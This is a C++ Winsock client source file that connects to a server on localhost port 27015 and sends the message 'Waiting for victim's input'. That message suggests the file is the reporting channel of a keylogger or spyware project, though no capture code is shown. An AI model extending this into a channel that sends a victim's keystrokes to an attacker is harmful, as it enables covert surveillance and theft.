#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>
#include <iostream>
#include "connection.h"

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Mswsock.lib")
#pragma comment(lib, "AdvApi32.lib")

#define DEFAULT_PORT "27015"
#define DEFAULT_BUFLEN 512

SOCKET ConnectSocket = INVALID_SOCKET;

bool clientConnection() {
    WSADATA wsaData;
    struct addrinfo* result = NULL, * ptr = NULL, hints;
    const char* serverIP = "127.0.0.1";
    int iResult;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        printf("WSAStartup failed with error: %d\n", iResult);
        return false;
    }

    ZeroMemory(&hints, sizeof(hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    iResult = getaddrinfo(serverIP, DEFAULT_PORT, &hints, &result);
    if (iResult != 0) {
        printf("getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return false;
    }

    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("socket failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return false;
        }

        iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        printf("Unable to connect to server!\n");
        WSACleanup();
        return false;
    }

    printf("Connected successfully to server: %s\n", serverIP);

    const char* hello = "Client here!\n Waiting for victim's input... \n";
    iResult = send(ConnectSocket, hello, (int)strlen(hello), 0);
    if (iResult == SOCKET_ERROR) {
        printf("send failed with error: %d\n", WSAGetLastError());
        cleanupConnection();
        return false;
    }

    return true;
}

void cleanupConnection() {
    if (ConnectSocket != INVALID_SOCKET) {
        shutdown(ConnectSocket, SD_BOTH);
        closesocket(ConnectSocket);
        ConnectSocket = INVALID_SOCKET;
    }
    WSACleanup();
}

BOOL WINAPI ConsoleHandler(DWORD signal) {
    if (signal == CTRL_CLOSE_EVENT || signal == CTRL_SHUTDOWN_EVENT) {
        cleanupConnection();
    }
    return TRUE;
}
